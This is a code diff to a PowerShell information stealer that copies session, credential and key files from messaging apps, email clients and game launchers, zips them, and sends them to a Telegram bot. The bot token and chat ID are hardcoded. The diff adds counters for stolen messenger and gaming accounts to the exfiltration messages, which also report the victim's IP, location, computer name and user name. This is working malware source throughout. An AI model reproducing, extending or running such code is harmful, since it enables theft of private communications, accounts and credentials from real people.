@@ -23,11 +23,15 @@ $redExclamation = [char]0x203C
 $MoneySymbol = [char]::ConvertFromUtf32(0x1F4B5)
 $passwordSymbol = [char]::ConvertFromUtf32(0x1F511)
 $cookieSymbol = [char]::ConvertFromUtf32(0x1F36A)
+$messageSymbol = [char]::ConvertFromUtf32(0x2709)
+$joystickSymbol = [char]::ConvertFromUtf32(0x1F3AE)
 #--------------------
 #COUNTERS------------
 $moneyCounter = 0
 $cookieCounter = 0
 $passwordCounter = 0
+$messagersCounter = 0
+$gamesCounter = 0
 $vpnCounter = $false
 $winscpCounter = $false
 $ftpCounter = $false
@@ -108,7 +112,9 @@ function Send-TelegramFile {
         [string]$ZIPfile,
 		[int]$MoneyCount,
 		[int]$PasswdCount,
-		[int]$CookieCount
+		[int]$CookieCount,
+		[int]$messagersCount,
+		[int]$gamesCount
     )
 	
 	$greenCheckMark = [char]0x2705
@@ -118,7 +124,7 @@ function Send-TelegramFile {
 	$swinscpCounter = if ($global:winscpCounter) { $greenCheckMark } else { $redCrossMark }
 	$sftpCounter = if ($global:ftpCounter) { $greenCheckMark } else { $redCrossMark }	
 	
-    Send-File -filePath "$ZIPfile" -passwords "$PasswdCount" -cookies "$CookieCount" -wallets "$MoneyCount" -bVPN "$svpnCounter" -bWinSCP "$swinscpCounter" -bFTP "$sftpCounter"
+    Send-File -filePath "$ZIPfile" -passwords "$PasswdCount" -cookies "$CookieCount" -wallets "$MoneyCount" -bVPN "$svpnCounter" -bWinSCP "$swinscpCounter" -bFTP "$sftpCounter" -messagers "$messagersCount" -games "$gamesCount"
 }
 function Send-File {
     param (
@@ -126,6 +132,8 @@ function Send-File {
         [string]$passwords,
         [string]$cookies,
         [string]$wallets,
+		[string]$messagers,
+		[string]$games,
         [string]$bVPN,
         [string]$bWinSCP,
         [string]$bFTP
@@ -137,6 +145,8 @@ function Send-File {
     $MoneySymbol = [char]::ConvertFromUtf32(0x1F4B5)
     $passwordSymbol = [char]::ConvertFromUtf32(0x1F511)
     $cookieSymbol = [char]::ConvertFromUtf32(0x1F36A)
+	$messageSymbol = [char]::ConvertFromUtf32(0x2709)
+	$joystickSymbol = [char]::ConvertFromUtf32(0x1F3AE)
     #--------------------
     $botToken = "7484009227:AAEvngzrIKFNFdfSqECzWAqbnB5IXk8pjVo" 
 	$chatID = "-1002174598516"
@@ -157,7 +167,7 @@ function Send-File {
     $region = $ipInfo.region
     $country = $ipInfo.country
 
-    $caption = "$($redExclamation) Log [AIPS]`n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName`n$($cookieSymbol) $cookies $($passwordSymbol) $passwords $($MoneySymbol) $wallets`nDomain: $domain`nVPN: $bVPN`nFTP: $bFTP`nWinSCP: $bWinSCP"
+    $caption = "$($redExclamation) Log [AIPS]`n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName`n$($cookieSymbol) $cookies $($passwordSymbol) $passwords $($MoneySymbol) $wallets $($messageSymbol) $messagers $($joystickSymbol) $games`nDomain: $domain`nVPN: $bVPN`nFTP: $bFTP`nWinSCP: $bWinSCP"
 
     Add-Type -AssemblyName "System.Net.Http"
 
@@ -504,6 +514,9 @@ function Backup-Data {
         $telegramsession = Join-Path $folder_messaging "Telegram"
         New-Item -ItemType Directory -Force -Path $telegramsession | Out-Null
         $items = Get-ChildItem -Path $pathtele
+		#!! MESSAGERS COPY
+		$global:messagersCounter += 1
+		#--------------
         foreach ($item in $items) {
             if ($item.GetType() -eq [System.IO.FileInfo]) {
                 if (($item.Name.EndsWith("s") -and $item.Length -lt 200KB) -or
@@ -538,6 +551,9 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $element_session | Out-Null
         Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
         Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
+		#!! MESSAGERS COPY
+		$global:messagersCounter += 1
+		#--------------
     }
     elementstealer
 
@@ -547,7 +563,10 @@ function Backup-Data {
         if (!(Test-Path $icqfolder)) { return }
         $icq_session = "$folder_messaging\ICQ"
         New-Item -ItemType Directory -Force -Path $icq_session | Out-Null
-        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
+        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force
+		#!! MESSAGERS COPY
+		$global:messagersCounter += 1
+		#--------------
     }
     icqstealer
 
@@ -560,6 +579,9 @@ function Backup-Data {
         Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
         Copy-Item -Path "$signalfolder\attachments.noindex" -Destination $signal_session -Recurse -force
         Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
+		#!! MESSAGERS COPY
+		$global:messagersCounter += 1
+		#--------------
     } 
     signalstealer
 
@@ -583,6 +605,9 @@ function Backup-Data {
                 Copy-Item -Path $file.FullName -Destination $destinationPathFiles -Force
             }
         }
+		#!! MESSAGERS COPY
+		$global:messagersCounter += 1
+		#--------------
     }
     viberstealer
 
@@ -594,6 +619,9 @@ function Backup-Data {
         $regexPattern = "^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$"
         $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
         if ($parentFolder) {
+			#!! MESSAGERS COPY
+			$global:messagersCounter += 1
+			#--------------
             $localStateFolders = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
             foreach ($localStateFolder in $localStateFolders) {
                 $profilePicturesFolder = Get-ChildItem -Path $localStateFolder.FullName -Filter "profilePictures" -Recurse -Directory
@@ -619,6 +647,9 @@ function Backup-Data {
         $skype_session = "$folder_messaging\Skype"
         New-Item -ItemType Directory -Force -Path $skype_session | Out-Null
         Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
+		#!! MESSAGERS COPY
+		$global:messagersCounter += 1
+		#--------------
     }
     skype_stealer
     
@@ -629,7 +660,10 @@ function Backup-Data {
         if (!(Test-Path $pidgin_folder)) { return }
         $pidgin_accounts = "$folder_messaging\Pidgin"
         New-Item -ItemType Directory -Force -Path $pidgin_accounts | Out-Null
-        Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
+        Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force
+		#!! MESSAGERS COPY
+		$global:messagersCounter += 1
+		#--------------
     }
     pidgin_stealer
     
@@ -640,6 +674,9 @@ function Backup-Data {
         $tox_session = "$folder_messaging\Tox"
         New-Item -ItemType Directory -Force -Path $tox_session | Out-Null
         Get-ChildItem -Path "$tox_folder" |  Copy-Item -Destination $tox_session -Recurse -Force
+		#!! MESSAGERS COPY
+		$global:messagersCounter += 1
+		#--------------
     }
     tox_stealer
 
@@ -656,6 +693,9 @@ function Backup-Data {
         foreach ($file in $ssfnfiles) {
             Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
         }
+		#!! GAMING COPY
+		$global:gamesCounter += 1
+		#--------------
     }
     steamstealer
 
@@ -689,6 +729,9 @@ function Backup-Data {
                     $destination = Join-Path -Path $minecraft_session -ChildPath $pathName
                     New-Item -ItemType Directory -Path $destination -Force | Out-Null
                     Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
+					#!! GAMING COPY
+					$global:gamesCounter += 1
+					#--------------
                 }
             }
         }
@@ -704,6 +747,9 @@ function Backup-Data {
         Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
         Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
         Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
+		#!! GAMING COPY
+		$global:gamesCounter += 1
+		#--------------
     }
     epicgames_stealer
 
@@ -714,6 +760,9 @@ function Backup-Data {
         $ubisoft_session = "$folder_gaming\Ubisoft"
         New-Item -ItemType Directory -Force -Path $ubisoft_session | Out-Null
         Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
+		#!! GAMING COPY
+		$global:gamesCounter += 1
+		#--------------
     }
     ubisoftstealer
 
@@ -727,6 +776,9 @@ function Backup-Data {
         $destination = Join-Path $ea_session $parentDirName
         New-Item -ItemType Directory -Path $destination -Force | Out-Null
         Copy-Item -Path $eafolder -Destination $destination -Recurse -Force
+		#!! GAMING COPY
+		$global:gamesCounter += 1
+		#--------------
     }
     electronic_arts
 
@@ -737,6 +789,9 @@ function Backup-Data {
         $growtopia_session = "$folder_gaming\Growtopia"
         New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
         $save_file = "$growtopiafolder\save.dat"
+		#!! GAMING COPY
+		$global:gamesCounter += 1
+		#--------------
         if (Test-Path $save_file) { Copy-Item -Path $save_file -Destination $growtopia_session } 
     }
     growtopiastealer
@@ -748,6 +803,9 @@ function Backup-Data {
         $battle_session = "$folder_gaming\Battle.net"
         New-Item -ItemType Directory -Force -Path $battle_session | Out-Null
         $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
+		#!! GAMING COPY
+		$global:gamesCounter += 1
+		#--------------
         foreach ($file in $files) {
             Copy-Item -Path $file.FullName -Destination $battle_session
         }
@@ -805,6 +863,9 @@ function Backup-Data {
     $pattern = "^[a-z0-9]+\.default-esr$"
     $directories = Get-ChildItem -Path $thunderbirdfolder -Directory | Where-Object { $_.Name -match $pattern }
     $filter = @("key4.db","key3.db","logins.json","cert9.db","*.js")
+	#!! MESSAGERS COPY
+	$global:messagersCounter += 1
+	#--------------
     foreach ($directory in $directories) {
         $destinationPath = Join-Path -Path $thunderbirdbackup -ChildPath $directory.Name
         New-Item -ItemType Directory -Force -Path $destinationPath | Out-Null
@@ -830,6 +891,9 @@ function Backup-Data {
         $mailbird_db = "$folder_email\MailBird"
         New-Item -ItemType Directory -Force -Path $mailbird_db | Out-Null
         Copy-Item -Path "$mailbird_folder\Store\Store.db" -Destination $mailbird_db -Recurse -force
+		#!! MESSAGERS COPY
+		$global:messagersCounter += 1
+		#--------------
     } 
     mailbird_backup
 
@@ -1258,7 +1322,7 @@ function Backup-Data {
 	#--------------------------------------
 	Start-Sleep -Seconds 10
 	#--------------------------------------
-	Send-TelegramFile -ZIPfile $zipFilePath -MoneyCount $moneyCounter -PasswdCount $passwordCounter -CookieCount $cookieCounter
+	Send-TelegramFile -ZIPfile $zipFilePath -MoneyCount $moneyCounter -PasswdCount $passwordCounter -CookieCount $cookieCounter -messagersCount $messagersCounter -gamesCount $gamesCounter
 	Start-Sleep -Seconds 15
 	#-----------------------------------------------
 	Remove-Item "$zipFilePath" -Force
@@ -1272,7 +1336,7 @@ function Backup-Data {
 	$swinscpCounter = if ($global:winscpCounter) { $greenCheckMark } else { $redCrossMark }
 	$sftpCounter = if ($global:ftpCounter) { $greenCheckMark } else { $redCrossMark }
 	
-	$Omessage = "$($redExclamation) [STEAL] NEW LOG`n--------------`n$($cookieSymbol) $cookieCounter $($passwordSymbol) $passwordCounter $($MoneySymbol) $moneyCounter`n--------------`nVPN: $svpnCounter`nFTP: $sftpCounter`nWinSCP: $swinscpCounter`n--------------"
+	$Omessage = "$($redExclamation) [STEAL] NEW LOG`n--------------`n$($cookieSymbol) $cookieCounter $($passwordSymbol) $passwordCounter $($MoneySymbol) $moneyCounter $($messageSymbol) $messagersCounter $($joystickSymbol) $gamesCounter`n--------------`nVPN: $svpnCounter`nFTP: $sftpCounter`nWinSCP: $swinscpCounter`n--------------"
 	Send-TelegramMessage -message $Omessage
 	#--------------------------------------
 	# cleanup
